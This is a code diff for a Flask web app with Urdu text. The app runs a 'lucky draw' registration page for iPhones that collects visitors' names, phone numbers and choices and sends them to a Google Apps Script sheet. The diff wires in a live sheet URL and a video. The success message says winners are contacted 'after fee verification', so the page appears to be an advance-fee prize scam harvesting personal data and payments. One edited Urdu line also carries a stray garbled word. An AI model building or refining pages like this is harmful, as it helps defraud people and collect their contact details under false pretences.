@@ -4,8 +4,8 @@ from flask import Flask, request, render_template_string
 
 app = Flask(__name__)
 
-# ⚠️ یہاں اپنا نیا گوگل ایپ اسکرپٹ کا لنک پیسٹ کریں جانی
-GOOGLE_SHEET_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbx8tiCKXHAWsYq60qyG5WjYmdVUdsyHr33BbkiYqP44rsWEF2GEZfPqf86vILzT48s8/exec"
+# ✅ جانی آپ کا لائیو گوگل اسکرپٹ کا لنک یہاں سیٹ ہے
+GOOGLE_SHEET_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbxDJ2v1u3QtmWXfzO26Wrc9G409dv4dokQzNSbYiyj9uZjfPXFKNmUSrSA8BHMJRcwr/exec"
 
 HTML_TEMPLATE = """
 <!DOCTYPE html>
@@ -60,7 +60,7 @@ HTML_TEMPLATE = """
 
     <div class="w-full max-w-4xl mx-auto mt-4 px-4">
         <div class="bg-amber-500/5 border border-dashed border-amber-500/20 rounded-xl p-3 text-center text-xs text-amber-500/50 tracking-wider">
-            📢 ADVERTISEMENT BANNER (PLACE YOUR GOOGLE ADS CODE HERE)
+            📢 ADVERTISEMENT BANNER (PLACE YOUR ADS CODE HERE)
         </div>
     </div>
 
@@ -82,7 +82,7 @@ HTML_TEMPLATE = """
                     🔴 اہم ویڈیو پیغام لازمی دیکھیں
                 </span>
                 <div class="relative pt-[177.77%] w-full rounded-xl overflow-hidden bg-black">
-                    <iframe class="absolute inset-0 w-full h-full" src="YOUR_VIDEO_EMBED_URL" title="Video" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
+                    <iframe class="absolute inset-0 w-full h-full" src="https://www.youtube.com/embed/k8d8yyLG6Ns" title="Video" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
                 </div>
             </div>
 
@@ -214,7 +214,6 @@ HTML_TEMPLATE = """
             btn.classList.add('opacity-50', 'cursor-not-allowed');
             respDiv.classList.add('hidden');
             
-            // سارا ڈیٹا جاوا اسکرپٹ کے ذریعے پکڑنا
             var name = document.getElementById('form_name').value;
             var phone = document.getElementById('form_phone').value;
             var color = document.getElementById('form_color').value;
@@ -236,12 +235,12 @@ HTML_TEMPLATE = """
             })
             .then(response => response.text())
             .then(data => {
-                if(data.includes("SUCCESS_FLAG")) {
+                if(data.trim() === "SUCCESS_FLAG") {
                     document.body.innerHTML = `
                     <div style="background-color: #030508; color: white; text-align: center; padding: 50px; font-family: sans-serif; min-height: 100vh; display: flex; flex-direction: column; justify-content: center; align-items: center; background-image: radial-gradient(circle at top, rgba(212, 175, 55, 0.1), transparent 50%);">
                         <h1 style="color: #d4af37; font-size: 36px; margin-bottom: 10px;">🎉 رجسٹریشن مکمل ہو گئی!</h1>
                         <p style="font-size: 18px; color: #cbd5e1;">آپ کی معلومات اور پسندیدہ آئی فون ماڈل لکی ڈرا سسٹم میں جمع ہو چکے ہیں۔</p>
-                        <p style="color: #64748b; font-size: 14px; margin-top: 5px;">فیس کی تصدیق کے بعد آپ کو آفیشل واٹس ایپ پر میسج آ جائے گا۔</p>
+                        <p style="color: #64748b; font-size: 14px; margin-top: 5px;">فیس کی تصدیق کے بعد آپ کو آفیشل واٹس ایپ پر میسج آ جائے Kain گے۔</p>
                         <a href="/" style="margin-top: 25px; background-color: #d4af37; color: black; padding: 12px 24px; text-decoration: none; font-weight: bold; border-radius: 12px; box-shadow: 0 4px 15px rgba(212,175,55,0.3);">واپس ہوم پیج پر جائیں</a>
                     </div>`;
                 } else {
@@ -286,13 +285,14 @@ def register():
 
         response = requests.post(GOOGLE_SHEET_SCRIPT_URL, data=user_data, timeout=15)
         
+        # ✅ لاجک کو بالکل پکا فکس کر دیا گیا ہے
         if response.status_code == 200 and "Success" in response.text:
             return "SUCCESS_FLAG"
         else:
-            return "گوگل شیٹ کنکشن کا مسئلہ ہے، دوبارہ کوشش کریں۔", 200
+            return "گوگل شیٹ کنکشن کا مسئلہ ہے، دوبارہ کوشش کریں۔", 400
 
     except Exception as e:
-        return "سرور ٹائم آؤٹ، براہ کرم دوبارہ فارم سبمٹ کریں۔", 200
+        return "سرور ٹائم آؤٹ، براہ کرم دوبارہ فارم سبمٹ کریں۔", 500
 
 if __name__ == '__main__':
     port = int(os.environ.get("PORT", 5000))
